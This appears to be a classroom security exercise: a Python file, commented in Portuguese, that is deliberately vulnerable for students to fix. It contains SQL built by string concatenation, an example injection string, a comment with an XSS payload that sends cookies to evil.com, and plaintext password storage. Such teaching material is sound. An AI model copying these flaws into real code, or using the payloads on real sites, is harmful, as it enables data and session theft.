"""
⚠️ CÓDIGO INTENCIONALMENTE VULNERÁVEL — DESAFIO DE SEGURANÇA ⚠️

Este arquivo contém 2 vulnerabilidades propositais para os alunos
identificarem e corrigirem. NÃO USE ESTE CÓDIGO EM PRODUÇÃO!

Vulnerabilidade 1: SQL Injection (linha ~20)
Vulnerabilidade 2: XSS / Falta de sanitização (linha ~35)
"""
import psycopg2

# Simula conexão com banco
def get_connection():
    return psycopg2.connect("dbname=taskflow user=postgres")


# ❌ VULNERÁVEL — SQL INJECTION
def search_users(name: str):
    """Busca usuários pelo nome — VULNERÁVEL!"""
    conn = get_connection()
    cursor = conn.cursor()

    # PERIGO: Concatenação direta de input do usuário na query SQL
    query = f"SELECT * FROM users WHERE name = '{name}'"
    cursor.execute(query)

    # Um atacante pode enviar: name = "' OR '1'='1' --"
    # Isso retornaria TODOS os usuários do banco!

    results = cursor.fetchall()
    conn.close()
    return results


# ❌ VULNERÁVEL — XSS (Cross-Site Scripting)
def create_task(title: str, description: str):
    """Cria uma tarefa — VULNERÁVEL!"""
    conn = get_connection()
    cursor = conn.cursor()

    # PERIGO: O título é salvo sem nenhuma sanitização.
    # Se title = "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
    # Quando outro usuário visualizar essa tarefa, o script será executado!

    cursor.execute(
        f"INSERT INTO tasks (title, description) VALUES ('{title}', '{description}')"
    )
    conn.commit()
    conn.close()

    # Retorna o título sem escape — perigoso para renderizar em HTML
    return {"title": title, "description": description}


# ❌ BÔNUS: Senha em texto plano (para discussão em sala)
def create_user(name: str, email: str, password: str):
    """Cria usuário — VULNERÁVEL!"""
    conn = get_connection()
    cursor = conn.cursor()

    # PERIGO: Senha salva sem hash!
    cursor.execute(
        f"INSERT INTO users (name, email, password) VALUES ('{name}', '{email}', '{password}')"
    )
    conn.commit()
    conn.close()
